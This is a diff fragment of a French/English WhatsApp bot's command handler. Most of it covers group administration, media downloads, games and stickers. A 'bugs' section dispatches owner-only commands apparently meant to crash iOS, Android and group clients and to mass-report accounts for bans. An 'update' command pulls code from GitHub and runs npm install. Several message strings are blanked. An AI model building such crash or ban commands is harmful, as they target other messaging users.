+          await sock.sendMessage(remoteJid, { text: '❌  lors du unmute' });
+        }
+        break;
+
+      case 'invite':
+      case 'lien':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        try {
+          const inviteCode = await sock.groupInviteCode(remoteJid);
+          await sock.sendMessage(remoteJid, {
+            text: `🔗 *Lien d'invitation du groupe*\n\nhttps://chat.whatsapp.com/${inviteCode}`
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { 
+            text: '❌ Unable de récupérer le lien. Je dois être admin.' 
+          });
+        }
+        break;
+
+      case 'revoke':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminRevoke = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminRevoke && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        try {
+          await sock.groupRevokeInvite(remoteJid);
+          await sock.sendMessage(remoteJid, {
+            text: '✅ Lien d\'invitation réinitialisé!\n\nL\'ancien lien ne fonctionne plus.'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { 
+            text: '❌ . Je dois être admin.' 
+          });
+        }
+        break;
+
+      case 'glock':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminGlock = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminGlock && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        try {
+          await sock.groupSettingUpdate(remoteJid, 'locked');
+          await sock.sendMessage(remoteJid, {
+            text: '🔒 Paramètres du groupe *VERROUILLÉS*\n\nSeuls les admins peuvent modifier les infos du groupe.'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'gunlock':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminGunlock = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminGunlock && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        try {
+          await sock.groupSettingUpdate(remoteJid, 'unlocked');
+          await sock.sendMessage(remoteJid, {
+            text: '🔓 Paramètres du groupe *DÉVERROUILLÉS*\n\nTout le monde peut modifier les infos du groupe.'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'gname':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminGname = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminGname && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        if (args.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}gname <nouveau nom>`
+          });
+          break;
+        }
+
+        const newGroupName = args.join(' ');
+        try {
+          await sock.groupUpdateSubject(remoteJid, newGroupName);
+          await sock.sendMessage(remoteJid, {
+            text: `✅ Nom du groupe changé en:\n*${newGroupName}*`
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'gdesc':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+        
+        const isUserAdminGdesc = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminGdesc && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        if (args.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}gdesc <nouvelle description>`
+          });
+          break;
+        }
+
+        const newGroupDesc = args.join(' ');
+        try {
+          await sock.groupUpdateDescription(remoteJid, newGroupDesc);
+          await sock.sendMessage(remoteJid, {
+            text: `✅ Description du groupe modifiée!`
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'groupinfo':
+      case 'infos':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        try {
+          const metadata = await sock.groupMetadata(remoteJid);
+          const admins = metadata.participants.filter(p => p.admin).length;
+          const members = metadata.participants.length;
+          const desc = metadata.desc || 'Aucune description';
+          const owner = metadata.owner || 'Inconnu';
+          const created = metadata.creation ? new Date(metadata.creation * 1000).toLocaleDateString('fr-FR') : 'Inconnu';
+
+          await sock.sendMessage(remoteJid, {
+            text: `╔═══════════════════════════════════╗
+║      📊 𝗜𝗡𝗙𝗢𝗦 𝗚𝗥𝗢𝗨𝗣𝗘      ║
+╚═══════════════════════════════════╝
+
+📌 *Nom:* ${metadata.subject}
+
+👥 *:* ${members}
+👑 *:* ${admins}
+🔐 *:* @${owner.split('@')[0]}
+📅 *Créé le:* ${created}
+
+📝 *:*
+${desc}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
+            mentions: [owner]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'listonline':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        try {
+          const metadata = await sock.groupMetadata(remoteJid);
+          const participants = metadata.participants;
+          
+          let onlineList = `╔═══════════════════════════════════╗
+║    📱 𝗠𝗘𝗠𝗕𝗥𝗘𝗦 𝗘𝗡 𝗟𝗜𝗚𝗡𝗘    ║
+╚═══════════════════════════════════╝
+
+`;
+
+          let count = 0;
+          for (const participant of participants) {
+            try {
+              const status = await sock.fetchStatus(participant.id);
+              if (status) {
+                count++;
+                onlineList += `${count}. @${participant.id.split('@')[0]}\n`;
+              }
+            } catch (e) {
+              // Ignore les erreurs
+            }
+          }
+
+          onlineList += `\n📊 Total: ${count} membre(s) en ligne`;
+
+          await sock.sendMessage(remoteJid, {
+            text: onlineList,
+            mentions: participants.map(p => p.id)
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'jid':
+        const jidToShow = isGroup ? senderJid : remoteJid;
+        await sock.sendMessage(remoteJid, {
+          text: `📱 *Votre JID:*\n\n\`${jidToShow}\`\n\nCopiez-le pour l'utiliser comme admin.`
+        });
+        break;
+
+      case 'quoted':
+      case 'q':
+        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
+          await sock.sendMessage(remoteJid, { text: '❌   ' });
+          break;
+        }
+
+        const quotedMsg = message.message.extendedTextMessage.contextInfo.quotedMessage;
+        const quotedText = quotedMsg.conversation || quotedMsg.extendedTextMessage?.text || 'Message sans texte';
+        
+        await sock.sendMessage(remoteJid, {
+          text: `📝 *Message cité:*\n\n${quotedText}`
+        });
+        break;
+
+      case 'checkban':
+      case 'bancheck':
+      case 'isban':
+        await handleCheckBan(sock, args, remoteJid, senderJid, message);
+        break;
+
+      // =============================================
+      // COMMANDES BUGS 🪲
+      // =============================================
+
+      case 'kill.gc':
+      case 'killgc':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleKillGC(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'ios.kill':
+      case 'ioskill':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleIOSKill(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'andro.kill':
+      case 'androkill':
+      case 'androidkill':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleAndroKill(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'silent':
+      case 'report':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleSilent(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'bansupport':
+      case 'bansupp':
+      case 'xban':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleBanSupport(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'xcrash':
+      case 'megaban':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleMegaBan(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'updatedev':
+      case 'devupdate':
+      case 'managedev':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleUpdateDev(sock, args, remoteJid, senderJid);
+        break;
+
+      case 'update':
+      case 'maj':
+      case 'upgrade': {
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '\u26D4 Admins du bot uniquement.' });
+          break;
+        }
+        await sock.sendMessage(remoteJid, {
+          text:
+`\uD83D\uDD04 *MISE \u00C0 JOUR SEIGNEUR TD*
+\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+\u23F3 T\u00E9l\u00E9chargement depuis GitHub...
+\uD83D\uDD17 https://github.com/Azountou235/SEIGNEUR-TD-`
+        }, { quoted: message });
+
+        const { execSync, exec } = await import('child_process');
+        const _repoUrl = 'https://github.com/Azountou235/SEIGNEUR-TD-';
+        const _cwd = process.cwd();
+
+        try {
+          // Vérifier si git est disponible
+          execSync('git --version', { stdio: 'ignore' });
+
+          // Sauvegarder les fichiers config locaux
+          const _filesToKeep = ['creds.json', '.env', 'database.json', 'session'];
+
+          // Git pull
+          const _gitOut = execSync('git pull origin main 2>&1 || git pull origin master 2>&1', {
+            cwd: _cwd, encoding: 'utf8', timeout: 30000
+          });
+
+          const _isUpToDate = _gitOut.includes('Already up to date') || _gitOut.includes('up-to-date');
+
+          if (_isUpToDate) {
+            await sock.sendMessage(remoteJid, {
+              text:
+`\u2705 *D\u00E9j\u00E0 \u00E0 jour!*
+\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+\uD83C\uDF1F SEIGNEUR TD est d\u00E9j\u00E0 \u00E0 la derni\u00E8re version.
+\uD83D\uDD17 ${_repoUrl}`
+            });
+            break;
+          }
+
+          // npm install pour les nouvelles dépendances
+          await sock.sendMessage(remoteJid, {
+            text: '\uD83D\uDCE6 Installation des d\u00E9pendances...'
+          });
+          try {
+            execSync('npm install --production 2>&1', { cwd: _cwd, encoding: 'utf8', timeout: 60000 });
+          } catch(npmErr) {}
+
+          await sock.sendMessage(remoteJid, {
+            text:
+`\u2705 *MISE \u00C0 JOUR R\u00C9USSIE!*
+\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+\uD83D\uDE80 Nouvelles mises \u00E0 jour install\u00E9es!
+\uD83D\uDD04 Red\u00E9marrage du bot dans 3s...
+\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0\u25B0 100%`
+          });
+
+          // Redémarrer après 3 secondes
+          setTimeout(() => { process.exit(0); }, 3000);
+
+        } catch(gitErr) {
+          // Git non disponible → téléchargement direct via axios (compatible Pterodactyl)
+          await sock.sendMessage(remoteJid, {
+            text:
+`⚠️ *Git non disponible — Téléchargement direct...*
+🔗 ${_repoUrl}`
+          }, { quoted: message });
+
+          try {
+            // Télécharger le ZIP depuis GitHub
+            const zipUrl = 'https://github.com/Azountou235/SEIGNEUR-TD-/archive/refs/heads/main.zip';
+            const zipResp = await axios.get(zipUrl, {
+              responseType: 'arraybuffer',
+              timeout: 60000,
+              headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+
+            const zipPath = './update_download.zip';
+            fs.writeFileSync(zipPath, Buffer.from(zipResp.data));
+
+            await sock.sendMessage(remoteJid, {
+              text: '📦 Archive téléchargée ! Extraction en cours...'
+            });
+
+            // Extraire le ZIP avec unzipper
+            let unzipper;
+            try { unzipper = (await import('unzipper')).default || (await import('unzipper')); } catch(e) { throw new Error('Module unzipper manquant. Ajoute-le dans package.json.'); }
+
+            await new Promise((resolve, reject) => {
+              fs.createReadStream(zipPath)
+                .pipe(unzipper.Extract({ path: './' }))
+                .on('close', resolve)
+                .on('error', reject);
+            });
+
+            if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
+
+            await sock.sendMessage(remoteJid, {
+              text:
+`✅ *MISE À JOUR RÉUSSIE!*
+────────────────────────
+🚀 Fichiers mis à jour depuis GitHub !
+🔄 Redémarrage du bot dans 3s...
+▰▰▰▰▰▰▰▰▰▰ 100%`
+            });
+
+            setTimeout(() => { process.exit(0); }, 3000);
+
+          } catch(dlErr) {
+            await sock.sendMessage(remoteJid, {
+              text:
+`❌ *Échec de la mise à jour automatique*
+────────────────────────
+💡 Mets à jour manuellement depuis ton panel Pterodactyl :
+1️⃣ Va dans l'onglet *Files*
+2️⃣ Supprime les anciens fichiers
+3️⃣ Réimporte les fichiers depuis :
+🔗 ${_repoUrl}
+
+_Erreur: ${dlErr.message}_`
+            }, { quoted: message });
+          }
+        }
+        break;
+      }
+
+      case 'storestatus':
+      case 'storeinfo':
+      case 'storesave':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+        await handleStoreStatus(sock, remoteJid, command);
+        break;
+
+      // =============================================
+      // NOUVELLES COMMANDES OWNER
+      // =============================================
+
+      case 'block':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+
+        const mentionedBlock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedBlock) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}block @user`
+          });
+          break;
+        }
+
+        try {
+          await sock.updateBlockStatus(mentionedBlock, 'block');
+          await sock.sendMessage(remoteJid, {
+            text: `🚫 @${mentionedBlock.split('@')[0]} a été bloqué!`,
+            mentions: [mentionedBlock]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'unblock':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+
+        const mentionedUnblock = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedUnblock) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}unblock @user`
+          });
+          break;
+        }
+
+        try {
+          await sock.updateBlockStatus(mentionedUnblock, 'unblock');
+          await sock.sendMessage(remoteJid, {
+            text: `✅ @${mentionedUnblock.split('@')[0]} a été débloqué!`,
+            mentions: [mentionedUnblock]
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'join':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+
+        if (args.length === 0) {
+          await sock.sendMessage(remoteJid, {
+            text: `: ${config.prefix}join <lien du groupe>`
+          });
+          break;
+        }
+
+        const inviteLink = args[0].replace('https://chat.whatsapp.com/', '');
+        try {
+          await sock.groupAcceptInvite(inviteLink);
+          await sock.sendMessage(remoteJid, {
+            text: '✅ Bot a rejoint le groupe!'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ Lien invalide ou erreur' });
+        }
+        break;
+
+      case 'pp':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔  ' });
+          break;
+        }
+
+        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
+          await sock.sendMessage(remoteJid, {
+            text: '❌  ou répondez à une image'
+          });
+          break;
+        }
+
+        try {
+          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
+          const stream = await downloadContentFromMessage(imageMsg, 'image');
+          const buffer = await toBuffer(stream);
+          
+          await sock.updateProfilePicture(sock.user.id, buffer);
+          await sock.sendMessage(remoteJid, {
+            text: '✅ Photo de profil du bot mise à jour!'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ ' });
+        }
+        break;
+
+      case 'gpp':
+        if (!isGroup) {
+          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
+          break;
+        }
+
+        const isUserAdminGpp = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!isUserAdminGpp && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
+          break;
+        }
+
+        if (!message.message?.imageMessage && !message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
+          await sock.sendMessage(remoteJid, {
+            text: '❌  ou répondez à une image'
+          });
+          break;
+        }
+
+        try {
+          const imageMsg = message.message?.imageMessage || message.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage;
+          const stream = await downloadContentFromMessage(imageMsg, 'image');
+          const buffer = await toBuffer(stream);
+          
+          await sock.updateProfilePicture(remoteJid, buffer);
+          await sock.sendMessage(remoteJid, {
+            text: '✅ Photo de profil du groupe mise à jour!'
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ . Je dois être admin.' });
+        }
+        break;
+
+      case 'delete':
+      case 'del':
+        const isUserAdminDelete = isGroup ? await isGroupAdmin(sock, remoteJid, senderJid) : true;
+        if (!isUserAdminDelete && !isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+
+        if (!message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
+          await sock.sendMessage(remoteJid, { text: '❌ Répondez au message à supprimer' });
+          break;
+        }
+
+        try {
+          const quotedMsgKey = message.message.extendedTextMessage.contextInfo;
+          await sock.sendMessage(remoteJid, { 
+            delete: {
+              remoteJid: remoteJid,
+              fromMe: false,
+              id: quotedMsgKey.stanzaId,
+              participant: quotedMsgKey.participant
+            }
+          });
+        } catch (error) {
+          await sock.sendMessage(remoteJid, { text: '❌ Unable de supprimer ce message' });
+        }
+        break;
+
+      // =============================================
+      // 📥 COMMANDES DOWNLOAD (YouTube, TikTok, Insta)
+      // =============================================
+
+      case 'play':
+      case 'yt':
+      case 'playaudio':
+      case 'ytmp3':
+      case 'song':
+      case 'music':
+      case 'playvideo':
+      case 'ytvideo':
+      case 'ytmp4':
+      case 'playptt': {
+        if (!args[0]) {
+          await sock.sendMessage(remoteJid, {
+            text: `❌ Utilisation incorrecte.\n\n📌 Exemple:\n${config.prefix}${command} Alan Walker Faded`
+          }, { quoted: message });
+          break;
+        }
+
+        const searchQuery = args.join(' ');
+        const p = config.prefix;
+        const YT_API = 'https://api-faa.my.id/faa/ytplayvid';
+
+        // Réaction initiale
+        try { await sock.sendMessage(remoteJid, { react: { text: '✨', key: message.key } }); } catch(e) {}
+
+        if (command === 'play' || command === 'yt') {
+          // ── Menu principal ──
+          try {
+            const { data } = await axios.get(YT_API, { params: { q: searchQuery }, timeout: 20000 });
+
+            if (!data?.status || !data?.result) {
+              await sock.sendMessage(remoteJid, { text: '❌ Vidéo introuvable.' }, { quoted: message });
+              break;
+            }
+
+            const res = data.result;
+
+            await sock.sendMessage(remoteJid, {
+              text:
+`🎶 *Lecture YouTube*
+
+📌 Titre: *${res.searched_title || searchQuery}*
+🔗 Lien: ${res.searched_url || 'N/A'}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+*Choisis le format :*
+
+🎵  ${p}playaudio ${searchQuery}
+🎬  ${p}playvideo ${searchQuery}
+🎤  ${p}playptt ${searchQuery}
+━━━━━━━━━━━━━━━━━━━━━━━
+_Envoie la commande de ton choix_`
+            }, { quoted: message });
+
+            await sendCmdAudio(sock, remoteJid);
+            try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}
+
+          } catch (e) {
+            console.error('PLAY MENU ERROR:', e.message);
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Erreur lors de la requête.\n\n💡 ${e.message}`
+            }, { quoted: message });
+          }
+
+        } else if (['playaudio','ytmp3','song','music','playptt'].includes(command)) {
+          // ── Audio / PTT ──
+          const isPTT = command === 'playptt';
+          try { await sock.sendMessage(remoteJid, { react: { text: isPTT ? '🎤' : '🎵', key: message.key } }); } catch(e) {}
+
+          const loadMsgAudio = await sock.sendMessage(remoteJid, {
+            text: `⏳ *Téléchargement en cours...*`
+          });
+
+          try {
+            // API 1: cobalt.tools
+            let audioBuffer = null;
+            let titleFound = searchQuery;
+
+            const searchRes = await axios.get(`https://www.youtube.com/results?search_query=${encodeURIComponent(searchQuery)}`, {
+              headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 10000
+            });
+            const vidMatch = searchRes.data.match(/"videoId":"([^"]{11})","title":{"runs":\[{"text":"([^"]+)"}/);
+            const videoId = vidMatch ? vidMatch[1] : null;
+            titleFound = vidMatch ? vidMatch[2] : searchQuery;
+
+            if (!videoId) throw new Error('Vidéo introuvable');
+
+            const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
+
+            // Essai cobalt.tools
+            try {
+              const cobalt = await axios.post('https://api.cobalt.tools/api/json', {
+                url: watchUrl, isAudioOnly: true, aFormat: 'mp3'
+              }, { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }, timeout: 20000 });
+              const dUrl = cobalt.data?.url;
+              if (dUrl) {
+                const dlRes = await axios.get(dUrl, { responseType: 'arraybuffer', timeout: 90000, headers: { 'User-Agent': 'Mozilla/5.0' } });
+                audioBuffer = Buffer.from(dlRes.data);
+              }
+            } catch(e) { console.error('[cobalt audio]', e.message); }
+
+            // Essai yt-dlp via zylalabs si cobalt échoue
+            if (!audioBuffer) {
+              try {
+                const zyla = await axios.get(`https://zylalabs.com/api/2533/yt-downloader+api/2312/yt-downloader?url=${encodeURIComponent(watchUrl)}&type=audio`, {
+                  timeout: 30000, headers: { 'User-Agent': 'Mozilla/5.0' }
+                });
+                const dlUrl = zyla.data?.download_url || zyla.data?.url;
+                if (dlUrl) {
+                  const dlRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 90000 });
+                  audioBuffer = Buffer.from(dlRes.data);
+                }
+              } catch(e) { console.error('[zyla audio]', e.message); }
+            }
+
+            if (!audioBuffer || audioBuffer.length < 1000) throw new Error('Téléchargement échoué. Réessaie avec un autre titre.');
+
+            await sock.sendMessage(remoteJid, {
+              audio: audioBuffer,
+              mimetype: 'audio/mpeg',
+              ptt: isPTT,
+              fileName: `${titleFound}.mp3`
+            }, { quoted: message });
+
+            await sock.sendMessage(remoteJid, {
+              text: `✅ *${isPTT ? 'PTT' : 'Audio'} téléchargé !*\n🎵 ${titleFound}\n📏 ${(audioBuffer.length/1024/1024).toFixed(2)} MB\n\n© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`,
+              edit: loadMsgAudio.key
+            });
+
+            try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}
+
+          } catch (e) {
+            console.error('PLAY AUDIO/PTT ERROR:', e.message);
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Erreur lors du téléchargement ${isPTT ? 'PTT' : 'audio'}.\n\n💡 ${e.message}`,
+              edit: loadMsgAudio.key
+            });
+          }
+
+        } else if (['playvideo','ytvideo','ytmp4'].includes(command)) {
+          // ── Vidéo ──
+          try { await sock.sendMessage(remoteJid, { react: { text: '🎬', key: message.key } }); } catch(e) {}
+
+          const loadMsgVideo = await sock.sendMessage(remoteJid, {
+            text: `⏳ *Téléchargement en cours...*`
+          });
+
+          try {
+            let videoBuffer = null;
+            let titleFound = searchQuery;
+
+            const searchRes = await axios.get(`https://www.youtube.com/results?search_query=${encodeURIComponent(searchQuery)}`, {
+              headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 10000
+            });
+            const vidMatch = searchRes.data.match(/"videoId":"([^"]{11})","title":{"runs":\[{"text":"([^"]+)"}/);
+            const videoId = vidMatch ? vidMatch[1] : null;
+            titleFound = vidMatch ? vidMatch[2] : searchQuery;
+
+            if (!videoId) throw new Error('Vidéo introuvable');
+            const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
+
+            // Essai cobalt.tools
+            try {
+              const cobalt = await axios.post('https://api.cobalt.tools/api/json', {
+                url: watchUrl, vQuality: '360', isAudioMuted: false
+              }, { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }, timeout: 30000 });
+              const dUrl = cobalt.data?.url || cobalt.data?.picker?.[0]?.url;
+              if (dUrl) {
+                const dlRes = await axios.get(dUrl, { responseType: 'arraybuffer', timeout: 180000, headers: { 'User-Agent': 'Mozilla/5.0' } });
+                videoBuffer = Buffer.from(dlRes.data);
+              }
+            } catch(e) { console.error('[cobalt video]', e.message); }
+
+            if (!videoBuffer || videoBuffer.length < 10000) throw new Error('Téléchargement vidéo échoué. Réessaie ou utilise !playaudio.');
+
+            await sock.sendMessage(remoteJid, {
+              video: videoBuffer,
+              mimetype: 'video/mp4',
+              caption: `✅ *Vidéo téléchargée !*\n🎬 ${titleFound}\n📏 ${(videoBuffer.length/1024/1024).toFixed(1)} MB\n\n© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`,
+              fileName: `${titleFound}.mp4`
+            }, { quoted: message });
+
+            try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}
+
+          } catch (e) {
+            console.error('PLAYVIDEO ERROR:', e.message);
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Erreur lors du téléchargement vidéo.\n\n💡 ${e.message}`,
+              edit: loadMsgVideo.key
+            });
+          }
+        }
+        break;
+      }
+
+
+      case 'tiktok':
+      case 'tt':
+      case 'tik':
+        await handleTikTok(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'ig':
+      case 'insta':
+      case 'instagram':
+        await handleInstagram(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'fb':
+      case 'facebook':
+        await handleFacebook(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'apk':
+        await handleAPK(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'gdrive':
+      case 'googledrive':
+        await handleGDrive(sock, args, remoteJid, senderJid, message);
+        break;
+
+      case 'mediafire':
+      case 'mf':
+        await handleMediafire(sock, args, remoteJid, senderJid, message);
+        break;
+
+      // =============================================
+      // 📊 COMMANDES STATUS
+      // =============================================
+
+      case 'tostatus':
+      case 'mystatus':
+        await handleToStatus(sock, args, message, remoteJid, senderJid);
+        break;
+
+      case 'groupstatus':
+      case 'gcstatus':
+        await handleGroupStatus(sock, args, message, remoteJid, senderJid, isGroup);
+        break;
+
+      // =============================================
+      // 🎮 COMMANDES GAMES
+      // =============================================
+
+      case 'tictactoe':
+      case 'ttt':
+        await handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup);
+        break;
+
+      case 'quizmanga':
+      case 'quiz':
+        await handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup);
+        break;
+
+      case 'squidgame':
+      case 'sg':
+        if (!isAdmin(senderJid)) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
+          break;
+        }
+        await handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup);
+        break;
+
+      // =============================================
+      // COMMANDES STICKER
+      // =============================================
+
+      case 'sticker':
+      case 's':
+        try {
+          console.log('🔍 Commande sticker reçue');
+
+          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+          const username = message.pushName || 'CYBERTOJI';
+
+          // Support aussi image/vidéo directe (non quoted)
+          let effectiveQuoted = quotedMessage;
+          if (!effectiveQuoted) {
+            if (message.message?.imageMessage) {
+              effectiveQuoted = { imageMessage: message.message.imageMessage };
+            } else if (message.message?.videoMessage) {
+              effectiveQuoted = { videoMessage: message.message.videoMessage };
+            }
+          }
+
+          if (!effectiveQuoted) {
+            await sock.sendMessage(remoteJid, {
+              text: `❌ Réponds à une image ou vidéo pour créer un sticker!\nUsage: ${config.prefix}sticker`
+            });
+            break;
+          }
+
+          const isVideo = !!effectiveQuoted.videoMessage;
+          const isImage = !!effectiveQuoted.imageMessage;
+
+          if (!isVideo && !isImage) {
+            await sock.sendMessage(remoteJid, {
+              text: '❌ Le message cité n\'est pas une image ou une vidéo !'
+            });
+            break;
+          }
+
+          await sock.sendMessage(remoteJid, { text: '⏳ Création du sticker en cours...' });
+
+          // Importer les modules nécessaires
+          const { default: stickerPkg } = await import('wa-sticker-formatter');
+          const { Sticker: StickerClass, StickerTypes } = stickerPkg;
+          const { default: sharpLib } = await import('sharp');
+          const { default: ffmpegLib } = await import('fluent-ffmpeg');
+
+          // Télécharger le média via downloadContentFromMessage
